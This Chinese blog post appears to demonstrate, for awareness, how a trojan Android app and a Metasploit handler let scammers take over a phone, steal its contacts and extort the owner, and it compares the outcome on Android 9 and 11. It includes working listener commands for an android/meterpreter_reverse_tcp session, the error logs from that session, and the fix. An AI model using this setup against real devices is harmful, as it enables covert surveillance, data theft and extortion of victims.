ailx10说：这篇是在2022年8月之前写的，后来又改过。总有人问，自己的聊天和摄像头是不是被监控了，我也想拿一个能看见过程的小测试回答，而不是只靠猜。于是准备 APK、安装、配接收端，再对照不同安卓环境的表现，中间还遇到载荷和 handler 没配上的问题。一个环境里建立了会话，另一个没有，手机管家也给出了查杀提示，结果都被我记了下来。它更像当时的一次摸底：现象先放到桌面上，装软件、系统版本和安全提示这些平时嫌麻烦的步骤，确实会改变最后发生的事。

---

第一步：黑客或骗子团伙会准备好一个木马病毒，比如色情APP

![](/notes-assets/5d6dac12a5c1fb89f45c.jpg)

第二步：黑客或骗子团伙，会在公网上配置好监听服务

```
use exploit/multi/handler
set lhost 192.168.199.247
set lport 3333
set payload android/meterpreter_reverse_tcp
run
```

![](/notes-assets/9f90207ec494a32ad511.jpg)

这里有一些报错，比如：

```
[-] Command shell session 1 is not valid and will be closed
[*] 192.168.199.193 - Command shell session 1 closed.

[*] 192.168.199.195 - Meterpreter session 351 closed.  Reason: Died
[*] Sending stage (78179 bytes) to 192.168.199.195
[*]  - Meterpreter session 352 closed.  Reason: Died
```

解决方案是：

```
set payload android/meterpreter_reverse_tcp
```

第三步：黑客或骗子团伙将木马APP，通过QQ、微信或者钓鱼邮件或其他方式，投递到受害者手机上，这里的MainActivity就是木马病毒APP

![](/notes-assets/2310739c4523d69fb356.jpg)

原实验需目标安装并运行特定载荷；是否建立会话及能访问哪些信息取决于系统和权限。

![](/notes-assets/a7fcea91081bbe3fd8e3.jpg)

第五步：黑客或骗子团伙，拿到你的通讯录名单和手机号码，就会以将你的龌龊行为，通过短信的方式发送给你的通讯录里面的亲朋好友，达到勒索你钱财的目的

![](/notes-assets/218b3d3e6738c76be0eb.jpg)

网络安全任重道远，洗洗睡吧～

![动图](/notes-assets/c61dc73b75a62994cc09.gif)


安卓9和安卓11的不同表现，是这次记录最值得回看的地方。它提醒我，版本、权限和载荷配置都可能影响实验，不能把一次连不上当成设备从此高枕无忧。
